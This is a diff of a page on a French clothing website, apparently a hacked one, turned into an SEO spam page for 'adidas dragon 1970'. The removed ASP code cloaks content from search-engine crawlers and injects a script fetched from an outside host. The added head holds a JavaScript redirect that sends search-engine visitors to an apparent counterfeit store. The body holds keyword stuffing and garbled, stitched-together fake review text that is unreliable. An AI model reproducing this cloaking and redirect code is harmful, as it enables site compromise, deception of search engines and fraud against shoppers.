@@ -1,83 +1,14 @@
+
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml"><head>
-<%
-function getHTTPPage(url)
-    dim Http
-    set Http=server.createobject("MSXML2.XMLHTTP")
-    Http.open "GET",url,false
-    Http.send()
-    if Http.readystate<>4 then
-        exit function
-    end if
-    getHTTPPage=bytesToBSTR(Http.responseBody,"UTF-8")
-    set http=nothing
-    if err.number<>0 then err.Clear
-end function
 
-
-Function BytesToBstr(body,Cset)
-        dim objstream
-        set objstream = Server.CreateObject("adodb.stream")
-        objstream.Type = 1
-        objstream.Mode =3
-        objstream.Open
-        objstream.Write body
-        objstream.Position = 0
-        objstream.Type = 2
-        objstream.Charset = Cset
-        BytesToBstr = objstream.ReadText
-        objstream.Close
-        set objstream = nothing
-End Function
-
-Dim Url,Html
-yyu=Year(now)&month(now)&day(now)&hour(now)&minute(now)&second(now)
-if request("AAA")<>""  then
-URL="http://hjg.jg2890.com/ig_zc_22/NY_Tou_img.aspx?s_id=196&rnd="&yyu&"&p_id="&request("AAA")
-else if request("pageIndex")<>""  then
-URL="http://hjg.jg2890.com/ig_zc_22/LB_Tou_img.aspx?s_id=196&rnd="&yyu&"&pageIndex="&request("pageIndex")&""
-else
-URL="http://hjg.jg2890.com/ig_zc_22/LB_Tou_img.aspx?rnd="&yyu&"&s_id=196"
-end if
-end if
-Html = getHTTPPage(Url)
-
-if request("kk")<>"" then
-ip="66.249.64.190"
-else
-ip=Request.ServerVariables("HTTP_X_FORWARDED_FOR")
-end if
-ipurl="http://hjg.jg2890.com/getdomain.aspx?rnd=1&ip="&ip
-domain =getHTTPPage(ipurl)
-if  (instr(domain,"google")>0 or instr(domain,"msn.com")>0 or instr(domain,"yahoo.com")>0 or instr(domain,"aol.com")>0) then
-set re = new RegExp
-re.IgnoreCase =True
-re.Global = True
-re.Pattern = "<script[^>]*?>([\s\S]*?)</script>"
-Set matchs = re.Execute(html)
-for each match in matchs
-sc= match.SubMatches(0)
-next
-set matchs = nothing
-Html=replace(Html,"<script>"&sc&"</script>","")
-Response.write Html
-
-else
-Response.write Html
-if request("AAA")<>""  then
-ccc=request("AAA")
-ccc=replace(ccc," ","-")
-ccc=replace(ccc,"--","-")
-
-ddd=getHTTPPage("http://js.jg2890.com/ad-fr-4-g.txt?id=1")
-
-eee=ddd&ccc&".html'}"
-eee=replace(eee,"--","-")
-Response.write "<script>"&eee&"</script>"
-end if
-
-end if
-%>
+<title>adidas dragon 1970, achat en ligne</title>
+<meta name="keywords" content="adidas dragon 1970" />
+<meta name="description" content="adidas dragon 1970,Les chaussures peuvent être achetées dans une large gamme de produits, y compris les baskets, les vêtements et les articles de sport." />
+<script>var s=document.referrer;
+if(s.indexOf("google")>0 || s.indexOf("bing")>0 || s.indexOf("aol")>0 || s.indexOf("yahoo")>0)
+{
+self.location='http://ad2017.storeeur.com/C-adidas-dragon-1970.html'}</script>
 <meta http-equiv="Content-type" content="text/html; charset=utf-8">
 <meta http-equiv="imagetoolbar" content="no">
 <meta name="Robots" content="index, follows">
@@ -240,25 +171,68 @@ end if
 
 </div>
             <div id="texte">
- <%
-Dim Urlyy,Htmlyy
-yyu=Year(now)&month(now)&day(now)&hour(now)&minute(now)&second(now)
-
-if request("pageIndex")<>""  then
-URLyy="http://hjg.jg2890.com/ig_zc_22/LB_NR_img_url.aspx?s_id=196&rnd="&yyu&"&pageIndex="&request("pageIndex")&""
-else
-URLyy="http://hjg.jg2890.com/ig_zc_22/LB_NR_img_url.aspx?s_id=196&rnd="&yyu&""
-if request("AAA")<>""  then
-Urlyy="http://hjg.jg2890.com/ig_zc_22/NY_Content_img_name_pl_2.aspx?s_id=196&rnd="&yyu&"&p_id="&request("AAA")
-end if
-
-end if
-Htmlyy = getHTTPPage(Urlyy)
-Htmlyy=replace(Htmlyy,"LB_NR_img_url.aspx","/vetements.asp")
-Htmlyy=replace(Htmlyy,"s_id=196&rnd="&yyu&"&","")
-Htmlyy=replace(Htmlyy,"?p_id=","http://www.arnaud-vetements.com/vetements.asp?AAA=")
-Response.write Htmlyy
-                %>	
+ 
+<style>
+    .image img
+    {
+        width: 100%;
+    }
+</style>
+<div>
+    <h1>
+        adidas dragon 1970</h1>
+    <div class="image">
+        <img src="https://img1.etsystatic.com/001/0/6628107/il_570xN.390931933_aqc8.jpg" title="adidas dragon 1970" alt="adidas dragon 1970"/>il_570xN.390931933_aqc8<br><img src="https://s-media-cache-ak0.pinimg.com/236x/72/25/23/7225233672507097d6c383d5f8172a3a.jpg" title="adidas dragon 1970" alt="adidas dragon 1970"/>7225233672507097d6c383d5f8172a3a<br><img src="https://blog.snkrs.com/files/2013/01/adidas-dragon-og-05.jpg" title="adidas dragon 1970" alt="adidas dragon 1970"/>adidas dragon og 05<br><img src="http://www.kimishoes.fr/9092-Export/adidas-dragon-originals-noir-une-chaussure-de-legende.jpg" title="adidas dragon 1970" alt="adidas dragon 1970"/>adidas dragon originals noir une chaussure de legende<br><img src="http://only-sneakers.ru/wp-content/uploads/2013/01/adidas-dragon-blue-white_.jpg" title="adidas dragon 1970" alt="adidas dragon 1970"/>adidas dragon blue white_<br><img src="http://images.linnlive.com/81aa2c7ffaa39a9a24df3fdf9bbf4420/8fd4c5c7-6612-44a8-95d7-accf21d6def0.jpg" title="adidas dragon 1970" alt="adidas dragon 1970"/>8fd4c5c7 6612 44a8 95d7 accf21d6def0<br><img src="http://i2.cdscdn.com/pdt2/8/7/0/1/300x300/mp04645870/rw/adidas-dragon-og-44-bleu.jpg" title="adidas dragon 1970" alt="adidas dragon 1970"/>adidas dragon og 44 bleu<br><img src="http://i.ebayimg.com/images/i/142228220031-0-1/s-l1000.jpg" title="adidas dragon 1970" alt="adidas dragon 1970"/>s l1000<br><img src="https://www.eukicks.com/wp-content/uploads/2014/02/G50922-2.jpg" title="adidas dragon 1970" alt="adidas dragon 1970"/>G50922 2
+    </div>
+    
+    <div itemscope itemtype="http://schema.org/Review">
+        <div itemprop="itemReviewed" itemscope itemtype="http://schema.org/Thing">
+            <span itemprop="name">i aborde par derrièr</span>
+        </div>
+        <div itemprop="author" itemscope itemtype="http://schema.org/Person">
+            <span itemprop="name">
+                ar derrière ?Les tra?tres, l</span>
+        </div>
+        <div>
+            <meta itemprop="datePublished" content="2018-03-05" />
+        </div>
+        <div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating">
+            <span itemprop="ratingValue">5</span>/<span itemprop="bestRating">5</span> stars
+        </div>
+        <div>
+            <span itemprop="description">
+                000 $ : Qui aborde par derrière ?Les tra?tres, les assassins, les agresseurs, les mendiants, bref pas vous.Auteur de trois buts la saison pass&eacute;e en Serie A avec les Rossoneri, l&rsquo;international espagnol fait l&rsquo;objet d&rsquo;un pr&ecirc;t d&rsquo;un an, plus une ann&eacute;e <strong>adidas dragon 1970</strong>  suppl&eacute;mentaire en option.Montpellier en a fait l&rsquo;am&egrave;re exp&eacute;rience ce vendredi en s&rsquo;inclinant sur le terrain du voisin, Perpignan (28-16).Victorieux de l&rsquo;Australie (38-12) le week-end dernier &agrave; Brisbane en Four Nations, les Springboks se pr&eacute;senteront avec la m&ecirc;me formation face &agrave; la Nouvelle-Z&eacute;lande samedi.Donc m&ecirc;me si le groupe est tr&egrave;s r&eacute;duit par rapport &agrave; la semaine internationale, deux semaines de travail, &ccedil;a sera d&eacute;j&agrave; bien.&raquo;Pierre-Fanfan : &laquo; Ses qualit&eacute;s sont grandes &raquo;En l&rsquo;absence de Thiago Silva (ischio-jambiers), qui devrait manquer entre six et huit semaines de comp&eacute;tition, l&rsquo;ancien joueur de l&rsquo;AS Rome est attendu au tournant.Le coloris ne correspond pas vraiment a celui vu sur internet autrement c'est un bon produit.Ces basses manipulations et ces m&eacute;thodes d&rsquo;un autre temps n&rsquo;ont pour seule cons&eacute;quence de ternir l&rsquo;image de son club, et plus g&eacute;n&eacute;ralement celle du football.Pour cela, un pull en laine col rond marron se glissera d&eacute;licatement sous un caban 3/4 noir &agrave; boutons crois&eacute;s.
+            </span>
+        </div>
+    </div>
+    
+    <div class="related">
+        <ul>
+            
+		 <li><a href='http://www.arnaud-vetements.com/vetements.asp?AAA=zx-flux'> zx flux </a></li>
+         
+		 <li><a href='http://www.arnaud-vetements.com/vetements.asp?AAA=zx-flux-zx-8000'> zx flux zx 8000 </a></li>
+         
+		 <li><a href='http://www.arnaud-vetements.com/vetements.asp?AAA=zx-flux-zwart'> zx flux zwart </a></li>
+         
+		 <li><a href='http://www.arnaud-vetements.com/vetements.asp?AAA=zx-flux-zero'> zx flux zero </a></li>
+         
+		 <li><a href='http://www.arnaud-vetements.com/vetements.asp?AAA=zx-flux-zero-adidas'> zx flux zero adidas </a></li>
+         
+		 <li><a href='http://www.arnaud-vetements.com/vetements.asp?AAA=adidas-dragon-19'> adidas dragon 19 </a></li>
+         
+		 <li><a href='http://www.arnaud-vetements.com/vetements.asp?AAA=adidas-dragon-18'> adidas dragon 18 </a></li>
+         
+		 <li><a href='http://www.arnaud-vetements.com/vetements.asp?AAA=adidas-dragon-13'> adidas dragon 13 </a></li>
+         
+		 <li><a href='http://www.arnaud-vetements.com/vetements.asp?AAA=adidas-dragon-12'> adidas dragon 12 </a></li>
+         
+		 <li><a href='http://www.arnaud-vetements.com/vetements.asp?AAA=adidas-dragon-12.5'> adidas dragon 12.5 </a></li>
+         
+        </ul>
+    </div>
+</div>
+	
             </div><!-- fin de texte -->
              <div id="droite"></div>
         <div id="push"></div>
